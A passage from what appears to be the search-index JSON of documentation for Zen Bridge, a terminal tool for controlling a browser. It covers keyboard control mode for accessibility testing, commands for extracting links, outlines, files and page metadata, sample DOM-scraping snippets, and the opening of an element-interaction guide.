\"verbose-logging\": false\n  }\n}\n</code></pre> <p>Options:</p> <ul> <li><code>verbose</code> (default: <code>true</code>) - Show terminal announcements</li> <li><code>speak-all</code> (default: <code>true</code>) - Enable text-to-speech on macOS</li> <li><code>verbose-logging</code> (default: <code>false</code>) - Detailed debug output</li> </ul>"},{"location":"guide/control-mode/#practical-examples","title":"Practical Examples","text":""},{"location":"guide/control-mode/#example-1-form-navigation","title":"Example 1: Form Navigation","text":"<pre><code>zen control\n\n# Tab to first field \u2192 \"Email Input\"\n# Type: test@example.com\n# Tab to next field \u2192 \"Password Input\"\n# Type: password123\n# Tab to submit \u2192 \"Submit Button\"\n# Press Enter \u2192 Form submits\n# \u2192 Focus returns to submit button after page loads\n</code></pre>"},{"location":"guide/control-mode/#example-2-link-navigation","title":"Example 2: Link Navigation","text":"<pre><code>zen control\n\n# Tab through navigation \u2192 \"Home\", \"About\", \"Contact\"\n# Tab to main content link \u2192 \"Read More\"\n# Press Enter \u2192 Article opens\n# \u2192 Focus returns to \"Read More\" link position\n# Continue navigating from there\n</code></pre>"},{"location":"guide/control-mode/#example-3-modal-interaction","title":"Example 3: Modal Interaction","text":"<pre><code>zen control\n\n# Tab to button \u2192 \"Open Modal\"\n# Press Enter \u2192 Modal opens\n# Tab through modal \u2192 \"Close Button\", \"Save Button\"\n# Press Enter on \"Close\" \u2192 Modal closes\n# Continue navigating\n</code></pre>"},{"location":"guide/control-mode/#example-4-accessibility-audit","title":"Example 4: Accessibility Audit","text":"<pre><code>zen control\n\n# Tab through entire page\n# Verify:\n# - All interactive elements reachable?\n# - Focus indicators visible?\n# - Logical tab order?\n# - No focus traps?\n# - Keyboard shortcuts work?\n</code></pre>"},{"location":"guide/control-mode/#advanced-usage","title":"Advanced Usage","text":""},{"location":"guide/control-mode/#combine-with-other-commands","title":"Combine with Other Commands","text":"<p>Take screenshots of focused elements: <pre><code># Start control mode in one terminal\nzen control\n\n# In another terminal:\nzen eval \"document.activeElement\"\nzen screenshot --selector \"$0\" --output focused.png\n</code></pre></p> <p>Extract focused element info: <pre><code># While in control mode (other terminal):\nzen eval \"\n  const el = document.activeElement;\n  return {\n    tag: el.tagName,\n    text: el.textContent,\n    role: el.getAttribute('role'),\n    label: el.getAttribute('aria-label')\n  };\n\" --format json\n</code></pre></p> <p>Verify focus order: <pre><code># While in control mode (other terminal):\nzen eval \"\n  const focusable = Array.from(document.querySelectorAll(\n    'a, button, input, select, textarea, [tabindex]:not([tabindex=\\\"-1\\\"])'\n  ));\n  return focusable.map((el, i) =&gt; ({\n    index: i,\n    tag: el.tagName,\n    text: el.textContent?.substring(0, 30),\n    tabIndex: el.tabIndex\n  }));\n\" --format json\n</code></pre></p>"},{"location":"guide/control-mode/#test-focus-traps","title":"Test Focus Traps","text":"<pre><code>zen control\n\n# Navigate into component\n# Try to Tab out\n# If trapped \u2192 Accessibility issue!\n</code></pre>"},{"location":"guide/control-mode/#test-skip-links","title":"Test Skip Links","text":"<pre><code>zen control\n\n# First Tab should focus skip link\n# Press Enter\n# Verify focus jumps to main content\n</code></pre>"},{"location":"guide/control-mode/#test-keyboard-shortcuts","title":"Test Keyboard Shortcuts","text":"<pre><code>zen control\n\n# Try:\n# - Ctrl+F for search\n# - Escape to close modals\n# - Arrow keys for sliders\n# - Space for checkboxes\n</code></pre>"},{"location":"guide/control-mode/#use-cases","title":"Use Cases","text":""},{"location":"guide/control-mode/#1-accessibility-testing","title":"1. Accessibility Testing","text":"<p>Verify keyboard navigation compliance:</p> <ul> <li> All interactive elements reachable via Tab</li> <li> Logical tab order (left-to-right, top-to-bottom)</li> <li> Focus indicators visible</li> <li> No keyboard traps</li> <li> Skip links present and functional</li> <li> Modals trap focus appropriately</li> <li> Dropdowns navigable with arrows</li> <li> Forms completable without mouse</li> </ul>"},{"location":"guide/control-mode/#2-screen-reader-testing","title":"2. Screen Reader Testing","text":"<p>Test with keyboard + voice:</p> <pre><code># Enable text-to-speech\n# Edit config.json: \"speak-all\": true\n\nzen control\n# Navigate and listen to announcements\n# Verify meaningful names\n# Check announcement order\n</code></pre>"},{"location":"guide/control-mode/#3-focus-management-testing","title":"3. Focus Management Testing","text":"<p>Test focus behavior:</p> <pre><code>zen control\n# Open modal \u2192 Focus should enter modal\n# Close modal \u2192 Focus should return to trigger\n# Submit form \u2192 Focus should go to success message\n# Navigate \u2192 Focus should persist (unique to Zen Bridge!)\n</code></pre>"},{"location":"guide/control-mode/#4-keyboard-only-workflows","title":"4. Keyboard-Only Workflows","text":"<p>Browse without a mouse:</p> <pre><code>zen control\n# Navigate entirely from terminal\n# Perfect for accessibility demos\n# Great for focus management testing\n</code></pre>"},{"location":"guide/control-mode/#how-control-mode-works-internally","title":"How Control Mode Works Internally","text":""},{"location":"guide/control-mode/#1-terminal-setup","title":"1. Terminal Setup","text":"<pre><code>import sys, tty, termios\n\n# Save terminal settings\nold_settings = termios.tcgetattr(sys.stdin)\n\n# Enter raw mode (no buffering, no echo)\ntty.setraw(sys.stdin)\n</code></pre>"},{"location":"guide/control-mode/#2-key-capture-loop","title":"2. Key Capture Loop","text":"<pre><code>while True:\n    char = sys.stdin.read(1)  # Read single character\n\n    # Handle special keys\n    if char == '\\t':  # Tab\n        send_key_to_browser('Tab')\n    elif char == '\\r':  # Enter\n        send_key_to_browser('Enter')\n    # ... etc\n</code></pre>"},{"location":"guide/control-mode/#3-browser-script","title":"3. Browser Script","text":"<pre><code>// control.js (injected in browser)\ndocument.addEventListener('zenControl', (event) =&gt; {\n  const {key, shiftKey, ctrlKey, altKey} = event.detail;\n\n  // Simulate keyboard event\n  const keyEvent = new KeyboardEvent('keydown', {\n    key, shiftKey, ctrlKey, altKey,\n    bubbles: true\n  });\n\n  document.activeElement.dispatchEvent(keyEvent);\n});\n</code></pre>"},{"location":"guide/control-mode/#4-focus-tracking","title":"4. Focus Tracking","text":"<pre><code>document.addEventListener('focus', (event) =&gt; {\n  const element = event.target;\n\n  // Highlight focused element\n  element.style.outline = '2px solid blue';\n\n  // Send announcement to terminal\n  const name = getAccessibleName(element);\n  sendToTerminal(`Focus: ${name}`);\n}, true);\n</code></pre>"},{"location":"guide/control-mode/#5-auto-refocus","title":"5. Auto-refocus","text":"<pre><code>// Store focused element before navigation\nlet lastFocused = null;\n\ndocument.addEventListener('focus', (e) =&gt; {\n  lastFocused = e.target;\n}, true);\n\n// Restore after page load\nwindow.addEventListener('load', () =&gt; {\n  if (lastFocused) {\n    lastFocused.focus();\n  }\n});\n</code></pre>"},{"location":"guide/control-mode/#configuration-options","title":"Configuration Options","text":""},{"location":"guide/control-mode/#configjson","title":"config.json","text":"<pre><code>{\n  \"control\": {\n    \"verbose\": true,\n    \"speak-all\": true,\n    \"verbose-logging\": false\n  }\n}\n</code></pre>"},{"location":"guide/control-mode/#verbose-mode","title":"Verbose Mode","text":"<p>Enabled (default): <pre><code>Focus: Submit Button (button)\nFocus: Email Input (input)\nActivated: Submit Button\n</code></pre></p> <p>Disabled: <pre><code>(no terminal output)\n</code></pre></p>"},{"location":"guide/control-mode/#text-to-speech","title":"Text-to-Speech","text":"<p>Enabled (macOS only): <pre><code># Uses `say` command\nsay \"Submit Button\"\nsay \"Email Input\"\n</code></pre></p> <p>Disabled (default on Linux): <pre><code>(no voice output)\n</code></pre></p>"},{"location":"guide/control-mode/#troubleshooting","title":"Troubleshooting","text":""},{"location":"guide/control-mode/#keys-not-working","title":"Keys Not Working","text":"<p>Problem: Keys pressed but nothing happens in browser</p> <p>Solutions: 1. Verify browser tab is active 2. Check userscript is running 3. Refresh page 4. Restart control mode</p>"},{"location":"guide/control-mode/#focus-not-visible","title":"Focus Not Visible","text":"<p>Problem: Can't see what's focused</p> <p>Solutions: 1. Check element has focus styles 2. Try forcing outline:    <pre><code>zen eval \"document.activeElement.style.outline = '3px solid red'\"\n</code></pre> 3. Some elements have <code>outline: none</code> - accessibility issue!</p>"},{"location":"guide/control-mode/#control-mode-exits-immediately","title":"Control Mode Exits Immediately","text":"<p>Problem: Mode starts and exits right away</p> <p>Solutions: 1. Don't press <code>q</code> or <code>Ctrl+D</code> immediately 2. Check terminal supports raw mode 3. Try <code>zen control --help</code> first</p>"},{"location":"guide/control-mode/#cant-exit-control-mode","title":"Can't Exit Control Mode","text":"<p>Problem: Can't quit with <code>q</code> or <code>Ctrl+D</code></p> <p>Solutions: 1. Press <code>Ctrl+C</code> (force quit) 2. Close terminal window 3. Restart terminal</p>"},{"location":"guide/control-mode/#voice-not-working","title":"Voice Not Working","text":"<p>Problem: No text-to-speech on macOS</p> <p>Solutions: 1. Verify <code>say</code> command works: <code>say \"test\"</code> 2. Check config: <code>\"speak-all\": true</code> 3. macOS only - not available on Linux/Windows</p>"},{"location":"guide/control-mode/#best-practices","title":"Best Practices","text":""},{"location":"guide/control-mode/#1-test-on-real-content","title":"1. Test on Real Content","text":"<p>Don't just test on example pages - test your actual site:</p> <pre><code>zen control\n# Navigate your production site\n# Verify real user workflows\n</code></pre>"},{"location":"guide/control-mode/#2-document-issues","title":"2. Document Issues","text":"<p>Create accessibility audit reports:</p> <pre><code># While in control mode, document issues:\n# - Elements not reachable\n# - Poor focus indicators\n# - Illogical tab order\n# - Keyboard traps\n</code></pre>"},{"location":"guide/control-mode/#3-compare-with-screen-readers","title":"3. Compare with Screen Readers","text":"<p>Test with actual screen readers too:</p> <ul> <li>NVDA (Windows)</li> <li>JAWS (Windows)</li> <li>VoiceOver (macOS)</li> <li>Orca (Linux)</li> </ul> <p>Zen Bridge control mode is a supplement, not a replacement.</p>"},{"location":"guide/control-mode/#4-test-different-browsers","title":"4. Test Different Browsers","text":"<p>Keyboard behavior varies by browser:</p> <pre><code># Test in Chrome\nzen control\n\n# Test in Firefox\nzen control\n\n# Test in Safari\nzen control\n</code></pre>"},{"location":"guide/control-mode/#next-steps","title":"Next Steps","text":"<ul> <li>Advanced Usage - Scripting and automation patterns</li> <li>Element Interaction - Click, wait, and interact commands</li> </ul>"},{"location":"guide/control-mode/#quick-reference","title":"Quick Reference","text":"Command Action <code>zen control</code> Start keyboard control mode <code>Tab</code> Navigate forward <code>Shift+Tab</code> Navigate backward <code>Enter</code> Activate focused element <code>Escape</code> Return to body <code>q</code> or <code>Ctrl+D</code> Quit control mode <p>Config options: <pre><code>{\n  \"control\": {\n    \"verbose\": true,        // Terminal announcements\n    \"speak-all\": true,      // Text-to-speech (macOS)\n    \"verbose-logging\": false // Debug output\n  }\n}\n</code></pre></p>"},{"location":"guide/control-mode/#resources","title":"Resources","text":"<ul> <li>WebAIM: Keyboard Accessibility</li> <li>WCAG 2.1: Keyboard Accessible</li> <li>A11Y Project: Focus</li> </ul>"},{"location":"guide/data-extraction/","title":"Data Extraction","text":"<p>Master data extraction with Zen Bridge. Learn how to extract links, generate page outlines, get selected text, download files, and extract structured data from web pages.</p>"},{"location":"guide/data-extraction/#overview","title":"Overview","text":"<p>Zen Bridge provides specialized commands for data extraction:</p> <ul> <li><code>zen links</code> - Extract and analyze links</li> <li><code>zen outline</code> - Display page heading structure</li> <li><code>zen selected</code> - Get selected text</li> <li><code>zen download</code> - Find and download files</li> <li><code>zen info</code> - Get page metadata</li> </ul>"},{"location":"guide/data-extraction/#extracting-links","title":"Extracting Links","text":"<p>The <code>zen links</code> command extracts all links from a page with powerful filtering options.</p>"},{"location":"guide/data-extraction/#basic-usage","title":"Basic Usage","text":"<pre><code>zen links\n</code></pre> <p>Output: <pre><code>\u2192 Home Page\n  https://example.com/\n\n\u2197 External Resource\n  https://other-site.com/page\n\nTotal: 15 links (8 internal, 7 external)\n</code></pre></p> <p>Shows: - Link text (anchor text) - URL - Internal (\u2192) vs External (\u2197) indicators - Summary count</p>"},{"location":"guide/data-extraction/#filter-to-internal-links","title":"Filter to Internal Links","text":"<pre><code>zen links --only-internal\n</code></pre> <p>Shows only links to the same domain.</p>"},{"location":"guide/data-extraction/#filter-to-external-links","title":"Filter to External Links","text":"<pre><code>zen links --only-external\n</code></pre> <p>Shows only links to other domains.</p>"},{"location":"guide/data-extraction/#urls-only","title":"URLs Only","text":"<pre><code>zen links --only-urls\n</code></pre> <p>Outputs just URLs (one per line), perfect for piping:</p> <pre><code>https://example.com/page1\nhttps://example.com/page2\nhttps://external.com/resource\n</code></pre>"},{"location":"guide/data-extraction/#alphabetical-sorting","title":"Alphabetical Sorting","text":"<pre><code>zen links --alphabetically\n</code></pre> <p>Sorts links alphabetically by URL.</p>"},{"location":"guide/data-extraction/#link-enrichment","title":"Link Enrichment","text":"<p>Get detailed metadata for external links:</p> <pre><code>zen links --enrich-external\n</code></pre> <p>Fetches: - HTTP status code - MIME type (content-type) - File size - Page title - Language</p> <p>Example output: <pre><code>\u2197 Documentation\n  https://docs.example.com/\n  Status: 200 OK | Type: text/html | Size: 42KB | Lang: en\n  Title: Example Docs - Getting Started\n</code></pre></p>"},{"location":"guide/data-extraction/#json-output","title":"JSON Output","text":"<pre><code>zen links --json\n</code></pre> <p>Outputs structured JSON for scripting:</p> <pre><code>{\n  \"links\": [\n    {\n      \"text\": \"Home Page\",\n      \"url\": \"https://example.com/\",\n      \"internal\": true\n    },\n    {\n      \"text\": \"External Resource\",\n      \"url\": \"https://other-site.com/page\",\n      \"internal\": false,\n      \"status\": 200,\n      \"contentType\": \"text/html\",\n      \"size\": 42170,\n      \"title\": \"Resource Title\",\n      \"language\": \"en\"\n    }\n  ],\n  \"summary\": {\n    \"total\": 15,\n    \"internal\": 8,\n    \"external\": 7\n  }\n}\n</code></pre>"},{"location":"guide/data-extraction/#combined-filters","title":"Combined Filters","text":"<pre><code># External URLs only, alphabetically sorted\nzen links --only-external --only-urls --alphabetically\n\n# Internal links as JSON\nzen links --only-internal --json\n\n# External links with enrichment\nzen links --only-external --enrich-external\n</code></pre>"},{"location":"guide/data-extraction/#practical-uses","title":"Practical Uses","text":"<p>Export links for analysis: <pre><code>zen links --only-external --only-urls &gt; external-links.txt\n</code></pre></p> <p>Count total links: <pre><code>zen links --only-urls | wc -l\n</code></pre></p> <p>Find PDF links: <pre><code>zen links --only-urls | grep \"\\.pdf$\"\n</code></pre></p> <p>Check broken links: <pre><code>zen links --only-urls | xargs -I {} curl -s -o /dev/null -w \"%{http_code} {}\\n\" {}\n</code></pre></p> <p>Extract and process with jq: <pre><code>zen links --json | jq '.links[] | select(.internal == false) | .url'\n</code></pre></p>"},{"location":"guide/data-extraction/#page-outline","title":"Page Outline","text":"<p>Display the heading hierarchy of a page for accessibility audits and SEO analysis.</p>"},{"location":"guide/data-extraction/#basic-usage_1","title":"Basic Usage","text":"<pre><code>zen outline\n</code></pre> <p>Output: <pre><code>H1 Getting Started\n   H2 Installation\n      H3 Prerequisites\n      H3 Setup\n   H2 Configuration\n      H3 Basic Settings\n      H3 Advanced Options\n         H4 Environment Variables\n\nTotal: 7 headings\n</code></pre></p>"},{"location":"guide/data-extraction/#features","title":"Features","text":"<ul> <li>Native HTML headings - H1-H6 elements</li> <li>ARIA headings - Elements with <code>role=\"heading\"</code> and <code>aria-level</code></li> <li>Hierarchical indentation - Visual tree structure</li> <li>Colored output - Level labels in gray, text in white</li> </ul>"},{"location":"guide/data-extraction/#use-cases","title":"Use Cases","text":"<p>Accessibility audit: <pre><code>zen outline\n# Check for:\n# - Single H1\n# - Proper nesting (no skipped levels)\n# - Logical hierarchy\n</code></pre></p> <p>SEO analysis: <pre><code>zen outline | grep \"H1\"\n# Should find exactly one H1\n</code></pre></p> <p>Content structure: <pre><code>zen outline &gt; page-structure.txt\n# Document page organization\n</code></pre></p> <p>Compare pages: <pre><code>zen outline &gt; page1.txt\n# Navigate to another page\nzen outline &gt; page2.txt\ndiff page1.txt page2.txt\n</code></pre></p>"},{"location":"guide/data-extraction/#selected-text","title":"Selected Text","text":"<p>Get the currently selected text with metadata.</p>"},{"location":"guide/data-extraction/#basic-usage_2","title":"Basic Usage","text":"<pre><code>zen selected\n</code></pre> <p>Output: <pre><code>Selected Text:\n\"This is the selected text on the page.\"\n\nPosition: 42-78 (36 characters)\nContainer: DIV.content\nParent: ARTICLE.post\n</code></pre></p> <p>Shows: - Selected text - Character position - Container element - Parent element</p>"},{"location":"guide/data-extraction/#raw-text-only","title":"Raw Text Only","text":"<pre><code>zen selected --raw\n</code></pre> <p>Output: <pre><code>This is the selected text on the page.\n</code></pre></p> <p>Just the text, no metadata - perfect for piping.</p>"},{"location":"guide/data-extraction/#practical-uses_1","title":"Practical Uses","text":"<p>Copy to clipboard (macOS): <pre><code>zen selected --raw | pbcopy\n</code></pre></p> <p>Save to file: <pre><code>zen selected --raw &gt; selection.txt\n</code></pre></p> <p>Process with other tools: <pre><code>zen selected --raw | wc -w  # Count words\nzen selected --raw | tr '[:upper:]' '[:lower:]'  # Lowercase\n</code></pre></p> <p>Translate selection: <pre><code>zen selected --raw | translate-tool\n</code></pre></p>"},{"location":"guide/data-extraction/#download-files","title":"Download Files","text":"<p>Find and download files interactively from the current page.</p>"},{"location":"guide/data-extraction/#interactive-mode","title":"Interactive Mode","text":"<pre><code>zen download\n</code></pre> <p>Presents an interactive menu to select files:</p> <pre><code>Found 15 downloadable files:\n\nIMAGES (8 files)\n  1. hero-image.jpg (1920x1080)\n  2. logo.png (400x200)\n  ...\n\nPDF DOCUMENTS (3 files)\n  9. user-guide.pdf\n  10. report.pdf\n  ...\n\nSelect files to download (comma-separated, or 'all'):\n&gt;\n</code></pre>"},{"location":"guide/data-extraction/#list-files-only","title":"List Files Only","text":"<pre><code>zen download --list\n</code></pre> <p>Shows available files without downloading.</p>"},{"location":"guide/data-extraction/#custom-output-directory","title":"Custom Output Directory","text":"<pre><code>zen download --output ~/Downloads/example-com\n</code></pre> <p>Downloads to a specific directory.</p>"},{"location":"guide/data-extraction/#custom-timeout","title":"Custom Timeout","text":"<pre><code>zen download --timeout 60\n</code></pre> <p>For large files or slow connections (default: 30s).</p>"},{"location":"guide/data-extraction/#supported-file-types","title":"Supported File Types","text":"<p>Images: - jpg, jpeg, png, gif, svg, webp, bmp, ico</p> <p>Documents: - pdf, docx, xlsx, pptx, txt, csv, md</p> <p>Videos: - mp4, webm, avi, mov, mkv, flv</p> <p>Audio: - mp3, wav, ogg, m4a, flac</p> <p>Archives: - zip, rar, tar, gz, tar.gz, 7z, bz2</p>"},{"location":"guide/data-extraction/#how-it-works","title":"How It Works","text":"<p>The <code>download</code> command:</p> <ol> <li>Searches for downloadable files:</li> <li><code>&lt;img&gt;</code> elements</li> <li><code>&lt;a&gt;</code> elements linking to files</li> <li><code>&lt;video&gt;</code> and <code>&lt;audio&gt;</code> sources</li> <li>CSS background images</li> <li> <p>Data URLs</p> </li> <li> <p>Categorizes files by type</p> </li> <li> <p>Presents interactive selection menu</p> </li> <li> <p>Downloads selected files in parallel</p> </li> <li> <p>Shows progress and file sizes</p> </li> </ol>"},{"location":"guide/data-extraction/#practical-uses_2","title":"Practical Uses","text":"<p>Download all images: <pre><code>zen download\n# Select \"Download all IMAGES\"\n</code></pre></p> <p>Download PDFs from documentation: <pre><code>zen download --output ~/Documents/docs\n# Select PDF files\n</code></pre></p> <p>Batch download resources: <pre><code># Navigate to resource page\nzen download --output ~/Downloads/resources\n</code></pre></p>"},{"location":"guide/data-extraction/#page-information","title":"Page Information","text":"<p>Get comprehensive metadata about the current page.</p>"},{"location":"guide/data-extraction/#basic-info","title":"Basic Info","text":"<pre><code>zen info\n</code></pre> <p>Output: <pre><code>URL:      https://example.com\nTitle:    Example Domain\nDomain:   example.com\nProtocol: https:\nState:    complete\nSize:     1280x720\n</code></pre></p>"},{"location":"guide/data-extraction/#extended-information","title":"Extended Information","text":"<pre><code>zen info --extended\n</code></pre> <p>Includes:</p> <p>Language &amp; Encoding: - Page language - Character set - Direction (LTR/RTL)</p> <p>Meta Tags: - Description - Keywords - Viewport settings - Author</p> <p>Resources: - Script count - Stylesheet count - Image count - Cookie count</p> <p>Security: - HTTPS status - Mixed content warnings - Content Security Policy - Referrer policy - Robots meta tags</p> <p>Accessibility: - Landmark count - Heading structure - Alt text issues - ARIA labels</p> <p>SEO: - Canonical URL - Open Graph tags - Twitter Card tags - Structured data (JSON-LD) - Robots directives</p> <p>Performance: - localStorage size - sessionStorage size - Service worker status</p>"},{"location":"guide/data-extraction/#json-output_1","title":"JSON Output","text":"<pre><code>zen info --json\n</code></pre> <p>Structured JSON for parsing:</p> <pre><code>zen info --json | jq '.url'\nzen info --json | jq '.title'\nzen info --json | jq '.extended.seo.canonical'\n</code></pre>"},{"location":"guide/data-extraction/#advanced-extraction-with-eval","title":"Advanced Extraction with eval","text":"<p>For custom extraction needs, use <code>zen eval</code>:</p>"},{"location":"guide/data-extraction/#extract-table-data","title":"Extract Table Data","text":"<pre><code>zen eval \"\n  const table = document.querySelector('table');\n  const headers = Array.from(table.querySelectorAll('th')).map(th =&gt; th.textContent.trim());\n  const rows = Array.from(table.querySelectorAll('tbody tr')).map(tr =&gt;\n    Array.from(tr.cells).map(cell =&gt; cell.textContent.trim())\n  );\n  return {headers, rows};\n\" --format json &gt; table.json\n</code></pre>"},{"location":"guide/data-extraction/#extract-product-data","title":"Extract Product Data","text":"<pre><code>zen eval \"\n  Array.from(document.querySelectorAll('.product')).map(product =&gt; ({\n    name: product.querySelector('.product-name').textContent.trim(),\n    price: product.querySelector('.product-price').textContent.trim(),\n    rating: product.querySelector('.rating')?.textContent,\n    image: product.querySelector('img')?.src,\n    available: !product.classList.contains('out-of-stock')\n  }))\n\" --format json &gt; products.json\n</code></pre>"},{"location":"guide/data-extraction/#extract-article-content","title":"Extract Article Content","text":"<pre><code>zen eval \"\n  ({\n    title: document.querySelector('h1')?.textContent,\n    author: document.querySelector('.author')?.textContent,\n    date: document.querySelector('time')?.getAttribute('datetime'),\n    content: document.querySelector('article')?.textContent.trim(),\n    tags: Array.from(document.querySelectorAll('.tag')).map(t =&gt; t.textContent.trim())\n  })\n\" --format json &gt; article.json\n</code></pre>"},{"location":"guide/data-extraction/#extract-all-images","title":"Extract All Images","text":"<pre><code>zen eval \"\n  Array.from(document.images).map(img =&gt; ({\n    src: img.src,\n    alt: img.alt,\n    width: img.naturalWidth,\n    height: img.naturalHeight,\n    title: img.title,\n    loading: img.loading\n  }))\n\" --format json &gt; images.json\n</code></pre>"},{"location":"guide/data-extraction/#extract-meta-tags","title":"Extract Meta Tags","text":"<pre><code>zen eval \"\n  const meta = {};\n  document.querySelectorAll('meta').forEach(tag =&gt; {\n    const name = tag.name || tag.property;\n    if (name) meta[name] = tag.content;\n  });\n  return meta;\n\" --format json &gt; meta.json\n</code></pre>"},{"location":"guide/data-extraction/#extract-forms","title":"Extract Forms","text":"<pre><code>zen eval \"\n  Array.from(document.forms).map(form =&gt; ({\n    action: form.action,\n    method: form.method,\n    id: form.id,\n    fields: Array.from(form.elements)\n      .filter(el =&gt; el.name)\n      .map(el =&gt; ({\n        name: el.name,\n        type: el.type,\n        required: el.required,\n        placeholder: el.placeholder\n      }))\n  }))\n\" --format json &gt; forms.json\n</code></pre>"},{"location":"guide/data-extraction/#extract-structured-data-json-ld","title":"Extract Structured Data (JSON-LD)","text":"<pre><code>zen eval \"\n  Array.from(document.querySelectorAll('script[type=\\\"application/ld+json\\\"]'))\n    .map(script =&gt; JSON.parse(script.textContent))\n\" --format json &gt; structured-data.json\n</code></pre>"},{"location":"guide/data-extraction/#data-cleaning-processing","title":"Data Cleaning &amp; Processing","text":""},{"location":"guide/data-extraction/#text-normalization","title":"Text Normalization","text":"<pre><code>zen eval \"\n  const text = document.querySelector('.content').textContent;\n  return text\n    .trim()\n    .replace(/\\s+/g, ' ')      // Multiple spaces to single\n    .replace(/\\n+/g, '\\n');     // Multiple newlines to single\n\" --format raw\n</code></pre>"},{"location":"guide/data-extraction/#html-stripping","title":"HTML Stripping","text":"<pre><code>zen eval \"\n  const html = document.querySelector('.content').innerHTML;\n  const temp = document.createElement('div');\n  temp.innerHTML = html;\n  return temp.textContent.trim();\n\" --format raw\n</code></pre>"},{"location":"guide/data-extraction/#data-validation","title":"Data Validation","text":"<pre><code>zen eval \"\n  Array.from(document.querySelectorAll('.item'))\n    .map(item =&gt; ({\n      title: item.querySelector('.title')?.textContent.trim(),\n      link: item.querySelector('a')?.href\n    }))\n    .filter(item =&gt; item.title &amp;&amp; item.link);  // Remove incomplete\n\" --format json\n</code></pre>"},{"location":"guide/data-extraction/#url-normalization","title":"URL Normalization","text":"<pre><code>zen eval \"\n  Array.from(document.links).map(a =&gt; {\n    try {\n      return new URL(a.href).href;  // Normalize URL\n    } catch {\n      return null;\n    }\n  }).filter(Boolean);\n\" --format json\n</code></pre>"},{"location":"guide/data-extraction/#batch-extraction-examples","title":"Batch Extraction Examples","text":""},{"location":"guide/data-extraction/#scrape-multiple-pages","title":"Scrape Multiple Pages","text":"<pre><code>#!/bin/bash\n# Extract data from multiple pages\n\nURLS=(\n  \"https://example.com/page1\"\n  \"https://example.com/page2\"\n  \"https://example.com/page3\"\n)\n\nfor url in \"${URLS[@]}\"; do\n  echo \"Extracting: $url\"\n  zen open \"$url\" --wait\n  zen eval \"({title: document.title, links: document.links.length})\" --format json &gt;&gt; data.jsonl\ndone\n</code></pre>"},{"location":"guide/data-extraction/#export-all-page-data","title":"Export All Page Data","text":"<pre><code>#!/bin/bash\n# Complete page export\n\nPAGE_URL=$(zen eval \"location.href\" --format raw)\nPAGE_TITLE=$(zen eval \"document.title\" --format raw)\n\nmkdir -p \"export/${PAGE_TITLE}\"\n\n# Links\nzen links --json &gt; \"export/${PAGE_TITLE}/links.json\"\n\n# Outline\nzen outline &gt; \"export/${PAGE_TITLE}/outline.txt\"\n\n# Metadata\nzen info --json &gt; \"export/${PAGE_TITLE}/info.json\"\n\n# Screenshots\nzen screenshot --selector \"body\" --output \"export/${PAGE_TITLE}/screenshot.png\"\n\necho \"Exported: ${PAGE_TITLE}\"\n</code></pre>"},{"location":"guide/data-extraction/#performance-tips","title":"Performance Tips","text":""},{"location":"guide/data-extraction/#1-limit-results","title":"1. Limit Results","text":"<pre><code>zen eval \"\n  Array.from(document.querySelectorAll('.item'))\n    .slice(0, 100)  // First 100 only\n    .map(item =&gt; item.textContent)\n\" --format json\n</code></pre>"},{"location":"guide/data-extraction/#2-extract-only-what-you-need","title":"2. Extract Only What You Need","text":"<pre><code>zen eval \"\n  // Good - extract only titles\n  Array.from(document.querySelectorAll('.item'))\n    .map(item =&gt; item.querySelector('.title').textContent)\n\"\n</code></pre>"},{"location":"guide/data-extraction/#3-use-efficient-selectors","title":"3. Use Efficient Selectors","text":"<pre><code># Good - specific selector\nzen eval \"document.querySelectorAll('.product .title')\"\n\n# Avoid - overly broad\nzen eval \"document.querySelectorAll('*').filter(...)\"\n</code></pre>"},{"location":"guide/data-extraction/#4-batch-dom-queries","title":"4. Batch DOM Queries","text":"<pre><code>zen eval \"\n  const container = document.querySelector('.container');\n  const items = container.querySelectorAll('.item');  // Query once\n  return Array.from(items).map(item =&gt; ({\n    title: item.querySelector('.title').textContent,\n    link: item.querySelector('a').href\n  }));\n\"\n</code></pre>"},{"location":"guide/data-extraction/#next-steps","title":"Next Steps","text":"<ul> <li>AI Features - AI-powered summarization and descriptions</li> <li>Advanced Usage - Complex patterns and scripting</li> </ul>"},{"location":"guide/data-extraction/#quick-reference","title":"Quick Reference","text":"Command Purpose Example <code>zen links</code> Extract links <code>zen links --only-external</code> <code>zen outline</code> Page heading structure <code>zen outline</code> <code>zen selected</code> Get selected text <code>zen selected --raw</code> <code>zen download</code> Download files <code>zen download --output ~/Downloads</code> <code>zen info</code> Page metadata <code>zen info --extended</code>"},{"location":"guide/element-interaction/","title":"Element Interaction","text":"<p>Master element interaction in Zen Bridge. Learn how to click, inspect, highlight, wait for elements, send keyboard input, and take screenshots - all from your terminal.</p>"},{"location":"guide/element-interaction/#overview","title":"Overview","text":"<p>Zen Bridge provides specialized commands for interacting with page elements:</p> <ul> <li><code>zen click</code> - Click elements</li> <li><code>zen double-click</code> / <code>zen right-click</code> - Double-click and right-click</li> <li><code>zen wait</code> - Wait for elements to appear/disappear</li> <li><code>zen send</code> - Type text into elements</li> <li><code>zen inspect</code> / <code>zen inspected</code> - Inspect elements</li> <li><code>zen highlight</code> - Highlight elements visually</li> <li><code>zen screenshot</code> - Screenshot elements</li> </ul>"},{"location":"guide/element-interaction/#clicking-elements","title":"Clicking Elements","text":""},{"location":"guide/element-interaction/#basic-click","title":"Basic Click","text":"<pre><code>zen click \"button#submit\"\n</code></pre> <p>Clicks the first element matching the selector.</p>"},{"location":"guide/element-interaction/#click-examples","title":"Click Examples","text":"<pre><code># Click button by ID\nzen click \"#submit-btn\"\n\n# Click link by class\nzen click \".nav-link\"\n\n# Click by complex selector\nzen click \"nav &gt; ul &gt; li:first-child &gt; a\"\n\n# Click by attribute\nzen click \"[data-action='delete']\"\n\n# Click by text content (using eval)\nzen eval \"Array.from(document.querySelectorAll('button')).find(b =&gt; b.textContent.includes('Submit')).click()\"\n</code></pre>"},{"location":"guide/element-interaction/#using-inspected-element","title":"Using Inspected Element","text":"<p>You can click the currently inspected element (from DevTools):</p> <pre><code># In DevTools, select an element ($0)\n# In browser console: zenStore($0)\n\n# Then click it\nzen click\n# or explicitly\nzen click \"$0\"\n</code></pre>"},{"location":"guide/element-interaction/#double-click","title":"Double Click","text":"<p>Double-click elements for actions that require it:</p> <pre><code>zen double-click \"div.editable\"\nzen double-click \".file-item\"\n</code></pre>"},{"location":"guide/element-interaction/#right-click-context-menu","title":"Right Click (Context Menu)","text":"<p>Trigger context menus:</p> <pre><code>zen right-click \"a.download-link\"\nzen right-click \".file-item\"\n</code></pre> <p>Click Types</p> <ul> <li><code>zen click</code> - Single left click</li> <li><code>zen double-click</code> - Double left click</li> <li><code>zen 